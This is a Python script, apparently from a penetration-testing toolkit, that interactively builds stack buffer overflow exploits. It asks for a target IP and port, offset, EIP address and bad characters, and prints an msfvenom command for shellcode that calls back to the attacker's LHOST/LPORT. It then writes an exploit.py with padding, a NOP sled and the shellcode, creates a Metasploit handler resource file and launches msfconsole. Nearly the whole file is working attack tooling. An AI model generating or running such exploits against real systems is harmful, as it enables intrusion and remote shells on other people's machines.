import sys
import os
import time
from datetime import datetime
from exploit.stack.header import header
from exploit.stack.footer_crash import footer_crash
from exploit.stack.footer_nocrash import footer_nocrash

date = datetime.now()

def print_help():
    print("To Generate a Exploit for Stack Buffer Overflow\n"
          "python3 stack.py exploit create")


def print_help_exploit():
    print("For The Crasher")
    print("Example For Crasher in Vulnerable server\n"
          "You Need To Type in TRUN /.:/\n"
          "and For the OPTION Y OR N ONLY")
    print("To Generate A Payload")
    print("You Need to Know the\n"
          "1. Offset\n"
          "2. EIP Value\n"
          "3. Bad Characters\n")
    print("\n\nWhen Generating Shellcode\n"
          "You Need to Use 'shellcode' as header in msfvenom use '-v shellcode'\n"
          "For Payloads Please Refer to\n"
          "https://medium.com/@hannahsuarez/full-list-of-546-msfvenom-payloads-39adb4d793c9"
          "\n\n"
          "For Inputting Shellcode just copy and Paste then to end it\n"
          "\nLinux = control-D and for Windows = control-D\n\n")


if sys.argv[1] == "exploit":
    if sys.argv[2] == "-h" or sys.argv[2] == "--help":
        print_help_exploit()
        sys.exit(0)
    elif sys.argv[2] == "create":
        print_help_exploit()
        option_crash = str(input("Do You have a Crasher(Y or N)): "))
        if option_crash == "Y" or option_crash == "y":
            # User Input
            crasher = str(input("Crasher: "))
            ip = str(input("Target IP: "))
            port = int(input("Target Port: "))
            offset = int(input("Offset: "))
            EIP = str(input("EIP(add 0x): "))
            bad_character = str(input("Input the Bad Characters(ex. \x00):"))
            nop = int(input("Spacings: "))
            payload = str(input("Please Enter Payload: "))
            LHOST = str(input("Your IP ADDRESS:"))
            LPORT = int(input("Your Port: "))
            print("Generate This Payload in Kali Then paste it in Shellcode: msfvenom -p "
                  + payload + " LHOST={0} LPORT={1} ".format(LHOST, LPORT)
                  + '-b "{0}" '.format(bad_character) + "-f python " + "-v shellcode")
            print("Shellcode: ")
            shell = sys.stdin.readlines()
            shell = "".join(shell)

            # init header and footer
            head = header(ip, port)
            foot = footer_crash(crasher)
            # Generate Exploit
            f = open('exploit.py', 'w+')
            f.write(
                "" + head + "\n"
                "" + shell + "\n"
                "buffer = '\x41' * " + str(offset) + "\n"
                "buffer += struct.pack('<L',"+EIP+")\n"
                "buffer +='\x90' * " + str(nop) + "\n"
                "buffer += shellcode\n\n"
                "" + foot + ""
            )
            f.close()
            print("exploit.py has been generated")
            start_msf = str(input("Do you want to Start Metasploit? (Y or N): "))
            if start_msf == "Y" or start_msf == "y":
                f = open('msf.rc', 'w+')
                f.write(
                    "use exploit/multi/handler\n"
                    "set payload {0}".format(payload) + '\n'
                    "set LHOST {0}".format(LHOST) + '\n'
                    "set LPORT {0}".format(LPORT) + '\n'
                    "set EXITONSESSION false\n"
                    "exploit -j"
                )
                f.close()
                time.sleep(1)
                os.system('msfconsole -r msf.rc')
        elif option_crash == "N" or option_crash == "n":
            # User Input
            ip = str(input("Target IP: "))
            port = int(input("Target Port: "))
            offset = int(input("Offset: "))
            EIP = str(input("EIP(add 0x): "))
            bad_character = str(input("Input the Bad Characters(ex.'\\x00'):"))
            nop = int(input("Spacings: "))
            payload = str(input("Please Enter Payload: "))
            LHOST = str(input("Your IP ADDRESS:"))
            LPORT = int(input("Your PORT: "))
            print("Generate This Payload in Kali Then paste it in Shellcode: msfvenom -p "
                  + payload + " LHOST={0} LPORT={1} ".format(LHOST, LPORT)
                  + '-b "{0}" '.format(bad_character) + "-f python " + "-v shellcode")
            print("Shellcode: ")
            shell = sys.stdin.readlines()
            shell = "".join(shell)

            # init header and footer
            head = header(ip, port)
            foot = footer_nocrash()

            # Generate Exploit
            f = open('exploit.py', 'w+')
            f.write(
                "" + head + "\n"
                "" + shell + "\n"
                "buffer = '\x41' * " + str(offset) + "\n"
                "buffer += struct.pack('<L'," + EIP + ")\n"
                "buffer +='\x90' * " + str(nop) + "\n"
                "buffer += shellcode\n\n"
                "" + foot + ""
            )
            f.close()
            print("exploit.py has been generated")
            start_msf = str(input("Do you want to Start Metasploit? (Y or N): "))
            if start_msf == "Y" or start_msf == "y":
                f = open('msf.rc', 'w+')
                f.write(
                    "use exploit/multi/handler\n"
                    "set payload {0}".format(payload) + '\n'
                    "set LHOST {0}".format(LHOST) + '\n'
                    "set LPORT {0}".format(LPORT) + '\n'
                    "set EXITONSESSION false\n"
                    "exploit -j"
                    )
                f.close()
                time.sleep(1)
                os.system('msfconsole -r msf.rc')
        else:
            print("Please Enter Y or N ONLY")
            sys.exit(0)
    else:
        print("not a valid option")
        sys.exit(0)
else:
    print_help()
    sys.exit(0)